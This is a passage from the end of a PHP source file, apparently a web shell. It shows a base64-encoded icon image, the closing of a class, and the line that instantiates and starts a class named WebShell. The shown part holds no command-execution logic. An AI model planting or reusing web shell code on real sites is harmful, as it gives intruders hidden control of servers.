                return "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAADoSURBVBgZBcExblNBGAbA2ceegTRBuIKOgiihSZNTcC5LUHAihNJR0kGKCDcYJY6D3/77MdOinTvzAgCw8ysThIvn/VojIyMjIyPP+bS1sUQIV2s95pBDDvmbP/mdkft83tpYguZq5Jh/OeaYh+yzy8hTHvNlaxNNczm+la9OTlar1UdA/+C2A4trRCnD3jS8BB1obq2Gk6GU6QbQAS4BUaYSQAf4bhhKKTFdAzrAOwAxEUAH+KEM01SY3gM6wBsEAQB0gJ+maZoC3gI6iPYaAIBJsiRmHU0AALOeFC3aK2cWAACUXe7+AwO0lc9eTHYTAAAAAElFTkSuQmCC";
            break;
        }
    }
}
$init=new WebShell();
?>